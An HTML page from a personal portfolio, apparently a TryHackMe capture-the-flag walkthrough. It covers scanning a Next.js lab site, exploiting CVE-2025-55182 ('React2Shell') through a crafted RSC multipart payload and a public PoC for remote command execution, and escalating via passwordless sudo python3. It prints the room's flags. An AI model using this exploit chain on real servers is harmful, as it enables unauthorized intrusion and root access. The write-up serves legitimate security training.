@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Corp Website // writeup</title>
+    <meta name="description" content="Enumerating a corporate site, finding the endpoints that were never meant to be public, and turning one of them into shell access.">
+    <meta name="theme-color" content="#0a0506">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="../style.css">
+    <script>
+        (function () {
+            try {
+                if (localStorage.getItem('theme') === 'light') {
+                    document.documentElement.setAttribute('data-theme', 'light');
+                }
+            } catch (e) { }
+        })();
+    </script>
+</head>
+
+<body class="writeup-page">
+    <div class="scanlines" aria-hidden="true"></div>
+    <div class="scroll-progress" id="scrollProgress"></div>
+
+    <header class="writeup-topbar">
+        <a class="prompt-link" href="../writeups.html">
+            <span class="prompt-user">sameekey@portfolio</span><span class="prompt-sep">:</span><span class="prompt-path">~/writeups</span><span class="prompt-sym">$</span>
+            <span class="prompt-cmd">cd .. [Archive Portal]</span>
+        </a>
+        <div class="topbar-actions">
+            <a class="card-link small github" href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs" target="_blank" rel="noopener"><i class="fab fa-github"></i> GitHub Repo</a>
+            <a class="card-link small" href="../index.html" style="margin-right: 0.5rem;"><i class="fas fa-terminal"></i> Main Dossier</a>
+            <span class="kbd-hint"><kbd>T</kbd> theme</span>
+            <button class="theme-toggle" id="themeToggle" type="button">
+                <i class="fas fa-moon"></i><span>Theme</span>
+            </button>
+        </div>
+    </header>
+
+    <main class="writeup-shell">
+        <article class="writeup-article">
+            <div class="writeup-head">
+                <p class="writeup-kicker">// verified laboratory walkthrough</p>
+                <h1>Corp Website</h1>
+                <div class="writeup-meta">
+                    <span class="badge">TryHackMe</span>
+      <span class="badge ghost">Web</span>
+      <span class="badge diff-easy">Easy</span>
+      <span class="meta-item"><i class="fas fa-calendar"></i> 2026-08-15</span>
+      <span class="meta-item"><i class="fas fa-tags"></i> TryHackMe / Web / Easy</span>
+      <span class="meta-item"><i class="fas fa-file-code"></i> corp-website-writeup.md</span>
+                </div>
+                <p class="writeup-summary">Enumerating a corporate site, finding the endpoints that were never meant to be public, and turning one of them into shell access.</p>
+                <div class="writeup-actions">
+                    <a class="card-link github" href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs/blob/main/corp-website-writeup.pdf" target="_blank" rel="noopener"><i class="fab fa-github"></i> Open on GitHub</a>
+                    <a class="card-link" href="corp-website-writeup.pdf" download><i class="fas fa-file-pdf"></i> Download Verified PDF</a>
+                    <a class="card-link primary" href="../writeups.html"><i class="fas fa-scroll"></i> Writeups Portal</a>
+                    <a class="card-link" href="../index.html#writeups"><i class="fas fa-arrow-left"></i> Main Dossier</a>
+                </div>
+            </div>
+            <div class="writeup-body">
+                <h1>Walkthrough</h1>
+<p>Platform TryHackMe Category Web / Exploitation Difficulty Medium Room Corp Website (Love At First Breach 2026) 10.48.133.123 Target IP OS Linux (Docker container, node:20-alpine) TL;DR — &quot;Romance &amp; Co&quot; is a corporate marketing site built on Next.js 16.0.6 (React Server Components). A purely static landing page hides a critical unauthenticatedRCE in the RSC rendering pipeline — CVE-2025-55182 (&quot;React2Shell&quot;), a prototype pollution chain that lets us run arbitrary Node.js commands. We abuse it to read the Dockerfile, confirm a passwordless sudo python3 rule, grab the user flag, then escalate to root for the final flag.</p>
+<p>Valentine&#39;s Day is fast approaching, and &quot;Romance &amp; Co&quot; are gearing up for their busiest season. Behind the scenes, however, things are going wrong. Security alerts suggest that &quot;Romance &amp; Co&quot; has already been compromised. Logs are incomplete, developers defensive and Shareholders want answers now! As a security analyst, your mission is to retrace the attacker&#39;s steps, uncover how the attackers exploited the vulnerabilities found on the &quot;Romance &amp; Co&quot; web application and determine exactly how the breach occurred. The web application is served at http://10.48.133.123:3000/.</p>
+<h2>2. Reconnaissance — Nmap</h2>
+<p>We start with a full port scan, then a service/version scan: nmap -p- --min-rate 5000 10.48.133.123 nmap -Pn -sV 10.48.133.123 PORT     STATE    SERVICE    VERSION 22/tcp   open    ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 80/tcp   closed  tcpwrapped</p>
+<p>3000/tcp open    ppp?        (web server) Only SSH and a web server on port 3000 are reachable. Sending a GET request to the root reveals the stack in the response headers: HTTP/1.1 200 OK X-Powered-By: Next.js x-nextjs-prerender: 1 Content-Type: text/html; charset=utf-8 The web application is built with Next.js — and given the way the page is constructed (React Server Components / App Router), we keep in mind that framework-level RCE bugs are a real possibility on modern Next.js.</p>
+<h2>3. Web Enumeration</h2>
+<p>The site is a one-page marketing site for &quot;Romance &amp; Co.&quot; — hero section, featured experiences (candlelit dinners, proposal planning, getaways) and a contact form. We pull the homepage and inspect the JS bundles and RSC payload: curl http://10.48.133.123:3000/ -o index.html # download the _next/static JS chunks referenced in the page We fuzz for hidden paths: ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.48.133.123:3000/FUZZ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.48.133.123:3000/FUZZ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.48.133.123:3000/api/FUZZ Result: nothing useful. The handful of hits (.git/logs/, cgi- bin/, render/https://www.google.com) are all Next.js 308 redirects that normalize the URL and land on a 404 — classic false positives. There is no hidden admin panel, no API directory, no .env, and no exposed .git repository. Examining the &lt;form&gt; on the page is also a rabbit hole: &lt;form class=&quot;space-y-4&quot;&gt; ... no action attribute, no method=&quot;POST&quot;, no JS submit handler ... &lt;/form&gt; The contact form is purely cosmetic front-end HTML and is never processed by the backend. There is no input vector to exploit on the application layer — the attack surface is the framework itself.</p>
+<h2>4. Pivot — CVE-2025-55182 &quot;React2Shell&quot;</h2>
+<p>From the fetched bundles and the running application we identify the exact framework version: package.json &quot;react&quot;:  &quot;19.2.0&quot;, &quot;react-dom&quot;: &quot;19.2.0&quot;, &quot;next&quot;:   &quot;16.0.6&quot; Next.js 16.0.6 is affected by CVE-2025-55182 (disclosed as &quot;React2Shell&quot; / R2SAE), a critical, unauthenticated RCE that abuses how React Server Components (RSC) handle a poisoned internal payload. The attack injects a malicious RSC &quot;Flight&quot; response in a multipart/form-data POST to the page, triggering a prototype pollution chain (<strong>proto</strong> → then → constructor:constructor) that lands on process.mainModule and executes arbitrary Node.js code on the server.</p>
+<h3>4.1 The payload</h3>
+<p>The core exploit (from the public PoC) posts a crafted RSC payload as the multipart field 0, with a JavaScript &quot;prefix&quot; that runs our command, Base64-encodes its output, and then throws a fake NEXT_REDIRECT whose URL carries the encoded output back to us: var res = process.mainModule.require(&#39;child_process&#39;) .execSync(&#39;&lt;COMMAND&gt; | base64 | tr &quot;\n&quot; &quot;@&quot;&#39;).toString().trim(); throw Object.assign(new Error(&#39;NEXT_REDIRECT&#39;), { digest: <code>NEXT_REDIRECT;push;/login?a=${res};307;</code> }); POST / HTTP/1.1 Host: 10.48.133.123:3000 Next-Action: x Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad ------WebKitFormBoundaryx8jO2oVc6SWP3Sad Content-Disposition: form-data; name=&quot;0&quot; {&quot;then&quot;:&quot;$1:<strong>proto</strong>:then&quot;,...,&quot;_response&quot;:{&quot;_prefix&quot;:&quot;var res=...&quot;,...}} ------WebKitFormBoundaryx8jO2oVc6SWP3Sad Content-Disposition: form-data; name=&quot;1&quot; &quot;$@0&quot; ------WebKitFormBoundaryx8jO2oVc6SWP3Sad Content-Disposition: form-data; name=&quot;2&quot;</p>
+<pre class="code-block" data-lang="bash"><code>[]</code></pre>
+<p>------WebKitFormBoundaryx8jO2oVc6SWP3Sad-- The response is a redirect to /login?a=&lt;base64&gt;, which we decode. We use the public PoC tool M4xSec/CVE-2025-55182-React2Shell-RCE-Shell against the target, running id as a sanity check: git clone https://github.com/M4xSec/CVE-2025-55182-React2Shell-RCE-Shell cd CVE-2025-55182-React2Shell-RCE-Shell</p>
+<p>python3 CVE-2025-55182-exploit.py -u http://10.48.133.123:3000 --custom &quot;id&quot; COMMAND OUTPUT DECODED: uid=100(daniel) gid=101(secgroup) groups=101(secgroup),101(secgroup) We have unauthenticated RCE running as the user daniel — no login, no web parameter required. This is exactly how the attacker got in.</p>
+<h2>5. Post-Exploitation — Reading the Dockerfile</h2>
+<p>With a reliable command channel we enumerate the application directory: python3 CVE-2025-55182-exploit.py -u http://10.48.133.123:3000 --custom &quot;ls -la&quot; python3 CVE-2025-55182-exploit.py -u http://10.48.133.123:3000 --custom &quot;cat Dockerfile&quot; total 308 drwxr-xr-x 1 daniel secgroup 4096 Jan 28  2026 . drwxr-xr-x 1 root   root     4096 Jan 28  2026 .. -rw-rw-r-- 1 daniel secgroup   42 Dec 20  2025 .dockerignore -rw-rw-r-- 1 daniel secgroup  373 Dec 10  2025 .gitignore drwxr-xr-x 1 daniel secgroup 4096 Jan 28  2026 .next -rw-r--r-- 1 daniel secgroup  595 Jan 23  2026 Dockerfile FROM node:20-alpine RUN apk add --no-cache sudo python3 netcat-openbsd WORKDIR /app COPY package*.json ./ RUN npm ci COPY . . EXPOSE 3000 CMD [&quot;npm&quot;, &quot;start&quot;] Two important details are leaked by the Dockerfile: 1.The container runs as a low-privileged node/daniel user (not root). 2.sudoandpython3 are installed — hinting at a privilege escalation path.</p>
+<h2>6. User Flag</h2>
+<p>The user&#39;s home directory holds the user flag: python3 CVE-2025-55182-exploit.py -u http://10.48.133.123:3000 --custom &quot;ls -la /home/daniel&quot; python3 CVE-2025-55182-exploit.py -u http://10.48.133.123:3000 --custom &quot;cat /home/daniel/user.txt&quot; total 20 drwxr-sr-x 1 daniel secgroup 4096 Jan 28  2026 . drwxr-sr-x 1 root   root     4096 Jan 28  2026 .. drwxr-sr-x 3 daniel secgroup 4096 Jan 28  2026 .npm -rw-r--r-- 1 daniel secgroup   27 Jan 28  2026 user.txt 🏳️ User Flag — THM{R34c7_2_5h311_3xpl017} (&quot;React 2 Shell&quot; — a nod to the React2Shell RCE used to get in.)</p>
+<h2>7. Privilege Escalation — sudo python3</h2>
+<p>Check what daniel can run with sudo: python3 CVE-2025-55182-exploit.py -u http://10.48.133.123:3000 --custom &quot;sudo -l&quot; Matching Defaults entries for daniel on romance: secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin User daniel may run the following commands on romance: (root) NOPASSWD: /usr/bin/python3 daniel can run /usr/bin/python3 as root with no password. An interpreter run as root is equivalent to root — we can spawn a shell or read any file. A one-liner lists /root: python3 CVE-2025-55182-exploit.py -u http://10.48.133.123:3000 \ --custom &quot;echo &#39;sudo python3 -c \&quot;import os; print(os.listdir(\&quot;/root\&quot;))\&quot;&#39; | base64 -d | sh&quot; Note: the exploit&#39;s JS prefix wraps our command in single quotes, so commands containing quotes are Base64-encoded and piped through base64 -d | sh to avoid breaking the payload.</p>
+<pre class="code-block" data-lang="bash"><code>[&#39;root.txt&#39;, &#39;.npm&#39;]</code></pre>
+<p>Now read the root flag:</p>
+<p>python3 CVE-2025-55182-exploit.py -u http://10.48.133.123:3000 \ --custom &quot;echo &#39;sudo python3 -c \&quot;import os; print(open(\&quot;/root/root.txt\&quot;).read())\&quot;&#39; | base64 -d | sh&quot; THM{Pr1v_35c_47_175_f1n357} 🏆 Root Flag — THM{Pr1v_35c_47_175_f1n357} (&quot;Priv esc it is the finisher&quot; — the misconfigured sudo rule was the last step.)</p>
+<h2>8. Flags Summary</h2>
+<p>Level Flag THM{R34c7_2_5h311_3xpl017} User THM{Pr1v_35c_47_175_f1n357} Root</p>
+<h2>9. Attack Chain Recap</h2>
+<p>Port scan ──&gt; Next.js 16.0.6 on :3000</p>
+<pre class="code-block" data-lang="bash"><code>       │
+       ├─ static marketing site, cosmetic form (rabbit hole), no hidden paths
+       │
+       └─ CVE-2025-55182 &quot;React2Shell&quot; (RSC prototype pollution)
+                └─&gt; unauthenticated RCE as daniel
+                          ├─&gt; read Dockerfile  (leaks sudo/python3)
+                          ├─&gt; read /home/daniel/user.txt  ──&gt; USER FLAG
+                          └─&gt; sudo -l  ──&gt; (root) NOPASSWD: /usr/bin/python3
+                                └─&gt; python3 root shell ──&gt; /root/root.txt ──&gt; ROOT</code></pre>
+<h2>10. Key Takeaways</h2>
+<p>1.Modern frameworks shift the attack surface. With static marketing sites there may be no user input at all — the vulnerability can live in the framework itself. Always check the framework version against recent CVEs (Next.js 16.0.6 → React2Shell). 2.CVE-2025-55182 is a critical unauthenticated RCE in React Server Components: a poisoned RSC payload triggers prototype pollution that reaches process.mainModule and executes arbitrary code. No credentials, no parameters — just a crafted POST. 3.Reading the Dockerfile after RCE is gold. It revealed the installed packages (sudo, python3) and the intended privilege-escalation path before we even ran sudo -l.</p>
+<p>4.sudo python3 = root. Giving an application user passwordless access to an interpreter is equivalent to giving them root — always restrict sudo to specific commands with fixed arguments. 5.Don&#39;t waste time on rabbit holes. The contact form had no action, no method, and no JS handler — nothing to inject into. The real entry point was invisible to directory fuzzing.</p>
+            </div>
+            <div class="writeup-foot">
+                <a class="card-link primary" href="../writeups.html"><i class="fas fa-scroll"></i> Full Writeups Portal</a>
+                <a class="card-link" href="../index.html#writeups"><i class="fas fa-arrow-left"></i> Main Dossier</a>
+                <a class="card-link github" href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs/blob/main/corp-website-writeup.pdf" target="_blank" rel="noopener"><i class="fab fa-github"></i> Open on GitHub</a>
+                <a class="card-link" href="corp-website-writeup.pdf" download><i class="fas fa-file-pdf"></i> Download Verified PDF</a>
+                <a class="card-link" href="mailto:parajulisameek@gmail.com"><i class="fas fa-envelope"></i> report a typo</a>
+            </div>
+        </article>
+    </main>
+
+    <footer class="site-footer">
+        <p class="footer-cmd">
+            <span class="prompt-user">sameekey@portfolio</span><span class="prompt-sep">:</span><span class="prompt-path">~</span><span class="prompt-sym">$</span>
+            echo "Defense is good. Offense is mandatory."
+        </p>
+        <p class="footer-muted">&copy; <span id="year"></span> Sameek Parajuli &middot; <a href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs" target="_blank" rel="noopener">GitHub /tryhackme_walkthroughs</a></p>
+    </footer>
+
+    <!-- Image Lightbox Modal -->
+    <div class="lightbox-modal" id="lightboxModal" hidden>
+        <div class="lightbox-backdrop"></div>
+        <div class="lightbox-content">
+            <img src="" id="lightboxImg" alt="Enlarged view">
+            <button class="lightbox-close" id="lightboxClose" type="button">&times;</button>
+        </div>
+    </div>
+
+    <div class="scroll-to-top" id="scrollToTop" role="button" tabindex="0" aria-label="Scroll to top">
+        <i class="fas fa-arrow-up"></i>
+    </div>
+
+    <script src="../script.js"></script>
+</body>
+
+</html>
